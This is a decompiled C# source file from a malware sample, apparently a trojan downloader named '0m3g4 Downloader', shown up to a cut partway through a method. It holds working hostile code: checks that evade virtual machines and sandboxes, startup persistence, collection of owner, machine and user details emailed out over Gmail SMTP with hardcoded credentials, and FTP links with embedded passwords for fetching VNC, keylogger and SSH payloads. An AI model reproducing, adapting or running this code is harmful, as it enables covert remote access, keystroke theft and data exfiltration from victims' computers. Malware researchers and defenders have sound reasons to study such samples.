// Decompiled with JetBrains decompiler
// Type: WindowsApplication1.Form1
// Assembly: testav, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BF122ADB-A512-4003-92B5-F313D95FE27C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.Win32.Generic-6cf9f04acbfaa2d10d3b7c796f7da8fd25fe6b4c5bcf5a1874ff80f61d4bec37.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using WindowsApplication1.My;

namespace WindowsApplication1
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("Im_Online")]
    private System.Windows.Forms.Timer _Im_Online;
    [AccessedThroughProperty("UpdateChecker")]
    private System.Windows.Forms.Timer _UpdateChecker;
    private const int BufferSize = 1024;
    private Thread ServerThread;
    private TcpClient HQ;
    private string Orders;
    private string ServerID;
    private string RemoteNotifier;
    private string pingsite;
    private string NetworkConnectivity;
    private Random RandomClass;
    private int RandomPort;
    private string HQUpLinkPort;
    private string DownloadPort;
    private IPHostEntry IPHost;
    private string MyIntIP;
    private string[] IPsplit;
    private string IP;
    private WebClient WC;
    private string MyExtIP;
    private string InternalNotifier;
    private string ExternalNotifier;
    private string MyVer;
    private string NewVer;
    private string InstalledVer;
    private string UpToDateVer;
    private string ExchangeServer;
    private string ExchangeFile;
    private string UpdateCheck;
    private string UpdateVersion;
    private string UpdateFile;
    private string VncFile;
    private string KeyLoggerFile;
    private string sSHFile;
    private string RootFolder;
    private string BaseFolder;
    private string ServerExchangeFolder;
    private string TempFolder;
    private string ToolsFolder;
    private string FilesFolder;
    private string PersistentFolder;
    private string StartupFolder;
    private string appname;
    private string RegisteredOwner;
    private const int CSIDL_LOCAL_APPDATA = 28;
    private StringBuilder path;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      lock (Form1.__ENCList)
        Form1.__ENCList.Add(new WeakReference((object) this));
      this.ServerID = "0m3g4 -= Downloader =-";
      this.pingsite = "www.google.com";
      this.RandomClass = new Random();
      this.HQUpLinkPort = Conversions.ToString(this.RandomClass.Next(1025, 63999));
      this.DownloadPort = Conversions.ToString(Conversions.ToDouble(this.HQUpLinkPort) + 2011.0);
      this.IPHost = Dns.GetHostByName(Dns.GetHostName());
      this.MyIntIP = this.IPHost.AddressList.GetValue(0).ToString();
      this.IPsplit = this.MyIntIP.Split(".".ToCharArray());
      this.WC = new WebClient();
      this.InternalNotifier = this.IPsplit[0] + "." + this.IPsplit[1] + "." + this.IPsplit[2] + ".250";
      this.ExternalNotifier = "0m3g4.sytes.net";
      this.MyVer = MyProject.Application.Info.Version.ToString();
      this.UpdateCheck = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/Downloader/0m3g4-Downloader.txt";
      this.UpdateVersion = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/Downloader/0m3g4-Version.txt";
      this.UpdateFile = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/Downloader/0m3g4-Downloader.rar";
      this.VncFile = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/Vnc/0m3g4-Vnc.rar";
      this.KeyLoggerFile = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/Keylogger/0m3g4-KeyLogger.rar";
      this.sSHFile = "ftp://0m3g4:p1cc1!!o@ftp.drivehq.com/0m3g4/Win7/sSH/0m3g4-sSH.rar";
      this.RootFolder = Directory.GetDirectoryRoot(Environment.SystemDirectory);
      this.BaseFolder = this.RootFolder + "System\\";
      this.ServerExchangeFolder = this.BaseFolder + "SystemExchange\\";
      this.TempFolder = this.ServerExchangeFolder + "SystemTemp";
      this.ToolsFolder = this.ServerExchangeFolder + "SystemTools";
      this.FilesFolder = this.ServerExchangeFolder + "SystemFiles";
      this.PersistentFolder = this.ServerExchangeFolder + "SystemPersistence";
      this.StartupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
      this.appname = Path.GetFileName(Application.ExecutablePath);
      this.RegisteredOwner = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", nameof (RegisteredOwner), (object) "error"));
      this.path = new StringBuilder(260);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Im_Online = new System.Windows.Forms.Timer(this.components);
      this.UpdateChecker = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.Im_Online.Interval = 90000;
      this.UpdateChecker.Enabled = true;
      this.UpdateChecker.Interval = 300000;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 266);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer Im_Online
    {
      [DebuggerNonUserCode] get => this._Im_Online;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Im_Online = value;
    }

    internal virtual System.Windows.Forms.Timer UpdateChecker
    {
      [DebuggerNonUserCode] get => this._UpdateChecker;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckForUpdates);
        if (this._UpdateChecker != null)
          this._UpdateChecker.Tick -= eventHandler;
        this._UpdateChecker = value;
        if (this._UpdateChecker == null)
          return;
        this._UpdateChecker.Tick += eventHandler;
      }
    }

    public void Anti_Detection()
    {
      this.VBoxHere();
      this.VmWareHere();
      this.VPCHere();
      this.ATE();
      this.ACWSbox();
      this.ANSbox();
      this.ASSbox();
      this.ASbox2();
      this.AASbox();
      this.NoSB();
    }

    [DllImport("kernel32", EntryPoint = "GetModuleHandleA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int GMH([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpMN);

    [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long FW([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpCN, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWN);

    public void NoSB()
    {
      if (Process.GetProcessesByName("SbieSvc").Length < 1)
        return;
      Environment.Exit(0);
    }

    public void VBoxHere()
    {
      if (!(Process.GetProcessesByName("VBoxService").Length >= 1 | Process.GetProcessesByName("VBoxTray").Length >= 1))
        return;
      Environment.Exit(0);
    }

    public void VmWareHere()
    {
      string str1 = "VMDragDetectWndClass";
      ref string local1 = ref str1;
      string str2 = (string) null;
      ref string local2 = ref str2;
      if (Form1.FW(ref local1, ref local2) != 0L)
        return;
      Environment.Exit(0);
    }

    public void VPCHere()
    {
      if (Process.GetProcessesByName("Virtual PC").Length < 1)
        return;
      Environment.Exit(0);
    }

    public void ATE()
    {
      if (!Process.GetCurrentProcess().MainModule.FileName.Contains("sample"))
        return;
      Environment.Exit(0);
    }

    public void ACWSbox()
    {
      if (!(Operators.CompareString(MyProject.Application.Info.DirectoryPath, "C:\\", false) == 0 | Operators.CompareString(MyProject.Application.Info.DirectoryPath, "D:\\", false) == 0 | Operators.CompareString(MyProject.Application.Info.DirectoryPath, "F:\\", false) == 0 | Operators.CompareString(MyProject.Application.Info.DirectoryPath, "X:\\", false) == 0) || Operators.CompareString(Interaction.Environ("username"), "Schmidti", false) != 0)
        return;
      Environment.Exit(0);
      ProjectData.EndApp();
    }

    public void ANSbox()
    {
      if (Operators.CompareString(Interaction.Environ("username"), "currentuser", false) != 0)
        return;
      Environment.Exit(0);
      ProjectData.EndApp();
    }

    public void ASSbox()
    {
      if (Operators.CompareString(MyProject.Application.Info.DirectoryPath, "C:\\", false) != 0 || Operators.CompareString(MyProject.Application.Info.AssemblyName, "file", false) != 0)
        return;
      Environment.Exit(0);
      ProjectData.EndApp();
    }

    public void ASbox2()
    {
      string lpMN = "SbieDll.dll";
      if (Form1.GMH(ref lpMN) == 0)
        return;
      Environment.Exit(0);
      ProjectData.EndApp();
    }

    public void AASbox()
    {
      if (!(Operators.CompareString(MyProject.Application.Info.AssemblyName, "Sample", false) == 0 | Operators.CompareString(Interaction.Environ("username"), "andy", false) == 0 | Operators.CompareString(Interaction.Environ("username"), "Andy", false) == 0))
        return;
      Environment.Exit(0);
      ProjectData.EndApp();
    }

    private void Form1_Load(object sender, EventArgs e)
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        Control.CheckForIllegalCrossThreadCalls = false;
label_3:
        num3 = 3;
        SystemEvents.PowerModeChanged += new PowerModeChangedEventHandler(this.PowerModeChanged);
label_4:
        num3 = 4;
        SystemEvents.SessionEnding += new SessionEndingEventHandler(this.SessionEnding);
label_5:
        num3 = 5;
        this.Anti_Detection();
label_6:
        num3 = 6;
        this.Decoy();
label_7:
        num3 = 7;
        this.Leave_Home();
label_8:
        num3 = 8;
        this.chkInternet();
label_9:
        num3 = 9;
        if (this.chkExistence())
          goto label_13;
label_10:
        num3 = 10;
        this.Resisitation();
label_11:
        num3 = 11;
        this.Clear_Internet_Data();
label_12:
        num3 = 12;
        this.FirstTimeNotify();
label_13:
label_14:
        num3 = 14;
        this.CheckForUpdate();
label_15:
        num3 = 15;
        this.AddToStartup();
label_16:
        num3 = 16;
        this.Victim_Online();
label_17:
        num3 = 17;
        this.ServerThread = new Thread(new ThreadStart(this.Server));
label_18:
        num3 = 18;
        this.ServerThread.IsBackground = true;
label_19:
        num3 = 19;
        this.ServerThread.Start();
label_20:
        num3 = 20;
        this.Im_Online.Start();
        goto label_27;
label_22:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
              case 14:
                goto label_14;
              case 15:
                goto label_15;
              case 16:
                goto label_16;
              case 17:
                goto label_17;
              case 18:
                goto label_18;
              case 19:
                goto label_19;
              case 20:
                goto label_20;
              case 21:
                goto label_27;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_22;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_27:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void FirstTimeNotify()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        if (Conversions.ToBoolean(this.NetworkConnectivity))
          goto label_14;
label_3:
        num3 = 3;
        if (System.IO.File.Exists(this.TempFolder + "\\nonet.txt"))
          goto label_9;
label_4:
        num3 = 4;
        FileStream fileStream = new FileStream(this.TempFolder + "\\nonet.txt", FileMode.Create, FileAccess.Write);
label_5:
        num3 = 5;
        StreamWriter streamWriter = new StreamWriter((Stream) fileStream);
label_6:
        num3 = 6;
        streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
label_7:
        num3 = 7;
        streamWriter.WriteLine("Try Email Later");
label_8:
        num3 = 8;
        streamWriter.Close();
        goto label_51;
label_9:
        num3 = 11;
label_10:
        num3 = 12;
        string str1 = MyProject.Computer.FileSystem.ReadAllText(this.TempFolder + "\\nonet.txt");
label_11:
        num3 = 13;
        if (str1.Contains("Email"))
          goto label_51;
label_12:
        num3 = 16;
        System.IO.File.AppendAllText(this.TempFolder + "\\nonet.txt", "\r\nTry Email Later");
        goto label_51;
label_14:
label_15:
        num3 = 20;
        string str2 = "--= Machine Details =--\r\n\r\n---===========================---\r\n\r\nRegistered Owner: \r\n[ " + this.RegisteredOwner + " ]\r\n\r\nComputer Name: \r\n[ " + Environment.MachineName.ToString() + " ]\r\n\r\nUser Name: \r\n[ " + Environment.UserName.ToString() + " ]\r\n\r\nOperating System Name: \r\n[ " + MyProject.Computer.Info.OSFullName.ToString() + " ]\r\n\r\n---===========================---\r\n\r\n-== 0m3g4 Downloader ==-\r\nVersion: [ " + this.MyVer + " ]";
label_16:
        num3 = 21;
        object obj = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Message"));
label_17:
        num3 = 22;
        object Instance1 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Configuration"));
label_18:
        num3 = 23;
        object Instance2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance1, (System.Type) null, "Fields", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
label_19:
        num3 = 24;
        string str3 = "0m3g4 Downloader \r\nJust Got An Activation On A New PC! \r\n\r\n" + str2;
label_20:
        num3 = 25;
        string str4 = "0m3g4 <The.0m3g4.Network@gmail.com>";
label_21:
        num3 = 26;
        string str5 = "0m3g4 <The.0m3g4.Network@gmail.com>";
label_22:
        num3 = 27;
        string str6 = "0m3g4 Downloader -= 1st Time Activation =-";
label_23:
        num3 = 28;
        string str7 = "http://schemas.microsoft.com/cdo/configuration/";
label_24:
        num3 = 29;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Item", new object[2]
        {
          (object) (str7 + "sendusing"),
          (object) 2
        }, (string[]) null, (System.Type[]) null);
label_25:
        num3 = 30;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Item", new object[2]
        {
          (object) (str7 + "smtpserver"),
          (object) "smtp.gmail.com"
        }, (string[]) null, (System.Type[]) null);
label_26:
        num3 = 31;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Item", new object[2]
        {
          (object) (str7 + "smtpserverport"),
          (object) 465
        }, (string[]) null, (System.Type[]) null);
label_27:
        num3 = 32;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Item", new object[2]
        {
          (object) (str7 + "smtpauthenticate"),
          (object) 1
        }, (string[]) null, (System.Type[]) null);
label_28:
        num3 = 33;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Item", new object[2]
        {
          (object) (str7 + "sendusername"),
          (object) "the.0m3g4.network"
        }, (string[]) null, (System.Type[]) null);
label_29:
        num3 = 34;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Item", new object[2]
        {
          (object) (str7 + "sendpassword"),
          (object) "p1cc1!!o"
        }, (string[]) null, (System.Type[]) null);
label_30:
        num3 = 35;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Item", new object[2]
        {
          (object) (str7 + "smtpusessl"),
          (object) 1
        }, (string[]) null, (System.Type[]) null);
label_31:
        num3 = 36;
        NewLateBinding.LateCall(Instance2, (System.Type) null, "Update", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
label_32:
        num3 = 37;
        object Instance3 = obj;
label_33:
        num3 = 38;
        NewLateBinding.LateSet(Instance3, (System.Type) null, "To", new object[1]
        {
          (object) str4
        }, (string[]) null, (System.Type[]) null);
label_34:
        num3 = 39;
        NewLateBinding.LateSet(Instance3, (System.Type) null, "From", new object[1]
        {
          (object) str5
        }, (string[]) null, (System.Type[]) null);
label_35:
        num3 = 40;
        NewLateBinding.LateSet(Instance3, (System.Type) null, "Subject", new object[1]
        {
          (object) str6
        }, (string[]) null, (System.Type[]) null);
label_36:
        num3 = 41;
        NewLateBinding.LateSet(Instance3, (System.Type) null, "TextBody", new object[1]
        {
          (object) str3
        }, (string[]) null, (System.Type[]) null);
label_37:
        num3 = 42;
        NewLateBinding.LateSet(Instance3, (System.Type) null, "Sender", new object[1]
        {
          (object) str5
        }, (string[]) null, (System.Type[]) null);
label_38:
        num3 = 43;
        NewLateBinding.LateSet(Instance3, (System.Type) null, "Configuration", new object[1]
        {
          RuntimeHelpers.GetObjectValue(Instance1)
        }, (string[]) null, (System.Type[]) null);
label_39:
        num3 = 44;
        Conversions.ToInteger(NewLateBinding.LateGet(Instance3, (System.Type) null, "Send", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
label_40:
        Instance3 = (object) null;
label_41:
        num3 = 46;
        obj = (object) null;
label_42:
        num3 = 47;
        Instance1 = (object) null;
label_43:
        num3 = 48;
        Instance2 = (object) null;
label_44:
        num3 = 49;
        System.IO.File.Delete(this.TempFolder + "\\nonet.txt");
        goto label_51;
label_46:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
              case 14:
              case 17:
              case 50:
                goto label_51;
              case 10:
              case 18:
                goto label_14;
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
                goto label_11;
              case 15:
              case 16:
                goto label_12;
              case 19:
                goto label_14;
              case 20:
                goto label_15;
              case 21:
                goto label_16;
              case 22:
                goto label_17;
              case 23:
                goto label_18;
              case 24:
                goto label_19;
              case 25:
                goto label_20;
              case 26:
                goto label_21;
              case 27:
                goto label_22;
              case 28:
                goto label_23;
              case 29:
                goto label_24;
              case 30:
                goto label_25;
              case 31:
                goto label_26;
              case 32:
                goto label_27;
              case 33:
                goto label_28;
              case 34:
                goto label_29;
              case 35:
                goto label_30;
              case 36:
                goto label_31;
              case 37:
                goto label_32;
              case 38:
                goto label_33;
              case 39:
                goto label_34;
              case 40:
                goto label_35;
              case 41:
                goto label_36;
              case 42:
                goto label_37;
              case 43:
                goto label_38;
              case 44:
                goto label_39;
              case 45:
                goto label_40;
              case 46:
                goto label_41;
              case 47:
                goto label_42;
              case 48:
                goto label_43;
              case 49:
                goto label_44;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_46;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_51:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void SelfDestructNotify()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        string str1 = "--= Machine Details =--\r\n\r\n---===========================---\r\n\r\nRegistered Owner: \r\n[ " + this.RegisteredOwner + " ]\r\n\r\nComputer Name: \r\n[ " + Environment.MachineName.ToString() + " ]\r\n\r\nUser Name: \r\n[ " + Environment.UserName.ToString() + " ]\r\n\r\nOperating System Name: \r\n[ " + MyProject.Computer.Info.OSFullName.ToString() + " ]\r\n\r\n---===========================---";
label_3:
        num3 = 3;
        object obj = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Message"));
label_4:
        num3 = 4;
        object Instance1 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Configuration"));
label_5:
        num3 = 5;
        object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance1, (System.Type) null, "Fields", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
label_6:
        num3 = 6;
        string str2 = "0m3g4 Downloader \r\nHas  Been Removed From " + this.RegisteredOwner + "'s PC! \r\n\r\n" + str1;
label_7:
        num3 = 7;
        string str3 = "0m3g4 <The.0m3g4.Network@gmail.com>";
label_8:
        num3 = 8;
        string str4 = "0m3g4 <The.0m3g4.Network@gmail.com>";
label_9:
        num3 = 9;
        string str5 = "0m3g4 Downloader -= Self-Destruction =-";
label_10:
        num3 = 10;
        string str6 = "http://schemas.microsoft.com/cdo/configuration/";
label_11:
        num3 = 11;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "sendusing"),
          (object) 2
        }, (string[]) null, (System.Type[]) null);
label_12:
        num3 = 12;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpserver"),
          (object) "smtp.gmail.com"
        }, (string[]) null, (System.Type[]) null);
label_13:
        num3 = 13;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpserverport"),
          (object) 465
        }, (string[]) null, (System.Type[]) null);
label_14:
        num3 = 14;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpauthenticate"),
          (object) 1
        }, (string[]) null, (System.Type[]) null);
label_15:
        num3 = 15;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "sendusername"),
          (object) "the.0m3g4.network"
        }, (string[]) null, (System.Type[]) null);
label_16:
        num3 = 16;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "sendpassword"),
          (object) "p1cc1!!o"
        }, (string[]) null, (System.Type[]) null);
label_17:
        num3 = 17;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpusessl"),
          (object) 1
        }, (string[]) null, (System.Type[]) null);
label_18:
        num3 = 18;
        NewLateBinding.LateCall(objectValue, (System.Type) null, "Update", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
label_19:
        num3 = 19;
        object Instance2 = obj;
label_20:
        num3 = 20;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "To", new object[1]
        {
          (object) str3
        }, (string[]) null, (System.Type[]) null);
label_21:
        num3 = 21;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "From", new object[1]
        {
          (object) str4
        }, (string[]) null, (System.Type[]) null);
label_22:
        num3 = 22;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Subject", new object[1]
        {
          (object) str5
        }, (string[]) null, (System.Type[]) null);
label_23:
        num3 = 23;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "TextBody", new object[1]
        {
          (object) str2
        }, (string[]) null, (System.Type[]) null);
label_24:
        num3 = 24;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Sender", new object[1]
        {
          (object) str4
        }, (string[]) null, (System.Type[]) null);
label_25:
        num3 = 25;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Configuration", new object[1]
        {
          RuntimeHelpers.GetObjectValue(Instance1)
        }, (string[]) null, (System.Type[]) null);
label_26:
        num3 = 26;
        Conversions.ToInteger(NewLateBinding.LateGet(Instance2, (System.Type) null, "Send", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
label_27:
        Instance2 = (object) null;
label_28:
        num3 = 28;
        obj = (object) null;
label_29:
        num3 = 29;
        Instance1 = (object) null;
label_30:
        goto label_37;
label_32:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_10;
              case 11:
                goto label_11;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
              case 14:
                goto label_14;
              case 15:
                goto label_15;
              case 16:
                goto label_16;
              case 17:
                goto label_17;
              case 18:
                goto label_18;
              case 19:
                goto label_19;
              case 20:
                goto label_20;
              case 21:
                goto label_21;
              case 22:
                goto label_22;
              case 23:
                goto label_23;
              case 24:
                goto label_24;
              case 25:
                goto label_25;
              case 26:
                goto label_26;
              case 27:
                goto label_27;
              case 28:
                goto label_28;
              case 29:
                goto label_29;
              case 30:
                goto label_30;
              case 31:
                goto label_37;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_32;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_37:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void UpdateNotify()
    {
label_1:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        int num3 = 2;
        this.InstalledVer = (string) null;
label_3:
        num3 = 3;
        this.InstalledVer = (string) Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Om3g4", "CurrentVersion", (object) "");
label_4:
        num3 = 4;
        string str1 = "--= Machine Details =--\r\n\r\n*** 0m3g4 Downloader Updated ***\r\n Old Version: [ " + this.MyVer + " ]\r\n New Version: [ " + this.InstalledVer + " ]\r\n\r\n---===========================---\r\n\r\nRegistered Owner: \r\n[ " + this.RegisteredOwner + " ]\r\n\r\nComputer Name: \r\n[ " + Environment.MachineName.ToString() + " ]\r\n\r\nUser Name: \r\n[ " + Environment.UserName.ToString() + " ]\r\n\r\nOperating System Name: \r\n[ " + MyProject.Computer.Info.OSFullName.ToString() + " ]\r\n\r\n---===========================---";
label_5:
        num3 = 5;
        object obj = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Message"));
label_6:
        num3 = 6;
        object Instance1 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("CDO.Configuration"));
label_7:
        num3 = 7;
        object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance1, (System.Type) null, "Fields", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
label_8:
        num3 = 8;
        string str2 = "0m3g4 Downloader \r\nHas  Been Updated\r\n\r\n" + str1;
label_9:
        num3 = 9;
        string str3 = "0m3g4 <The.0m3g4.Network@gmail.com>";
label_10:
        num3 = 10;
        string str4 = "0m3g4 <The.0m3g4.Network@gmail.com>";
label_11:
        num3 = 11;
        string str5 = "0m3g4 Downloader -= Update =-";
label_12:
        num3 = 12;
        string str6 = "http://schemas.microsoft.com/cdo/configuration/";
label_13:
        num3 = 13;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "sendusing"),
          (object) 2
        }, (string[]) null, (System.Type[]) null);
label_14:
        num3 = 14;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpserver"),
          (object) "smtp.gmail.com"
        }, (string[]) null, (System.Type[]) null);
label_15:
        num3 = 15;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpserverport"),
          (object) 465
        }, (string[]) null, (System.Type[]) null);
label_16:
        num3 = 16;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpauthenticate"),
          (object) 1
        }, (string[]) null, (System.Type[]) null);
label_17:
        num3 = 17;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "sendusername"),
          (object) "the.0m3g4.network"
        }, (string[]) null, (System.Type[]) null);
label_18:
        num3 = 18;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "sendpassword"),
          (object) "p1cc1!!o"
        }, (string[]) null, (System.Type[]) null);
label_19:
        num3 = 19;
        NewLateBinding.LateSet(objectValue, (System.Type) null, "Item", new object[2]
        {
          (object) (str6 + "smtpusessl"),
          (object) 1
        }, (string[]) null, (System.Type[]) null);
label_20:
        num3 = 20;
        NewLateBinding.LateCall(objectValue, (System.Type) null, "Update", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
label_21:
        num3 = 21;
        object Instance2 = obj;
label_22:
        num3 = 22;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "To", new object[1]
        {
          (object) str3
        }, (string[]) null, (System.Type[]) null);
label_23:
        num3 = 23;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "From", new object[1]
        {
          (object) str4
        }, (string[]) null, (System.Type[]) null);
label_24:
        num3 = 24;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Subject", new object[1]
        {
          (object) str5
        }, (string[]) null, (System.Type[]) null);
label_25:
        num3 = 25;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "TextBody", new object[1]
        {
          (object) str2
        }, (string[]) null, (System.Type[]) null);
label_26:
        num3 = 26;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Sender", new object[1]
        {
          (object) str4
        }, (string[]) null, (System.Type[]) null);
label_27:
        num3 = 27;
        NewLateBinding.LateSet(Instance2, (System.Type) null, "Configuration", new object[1]
        {
          RuntimeHelpers.GetObjectValue(Instance1)
        }, (string[]) null, (System.Type[]) null);
label_28:
        num3 = 28;
        Conversions.ToInteger(NewLateBinding.LateGet(Instance2, (System.Type) null, "Send", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
label_29:
        Instance2 = (object) null;
label_30:
        num3 = 30;
        obj = (object) null;
label_31:
        num3 = 31;
        Instance1 = (object) null;
label_32:
        goto label_39;
label_34:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
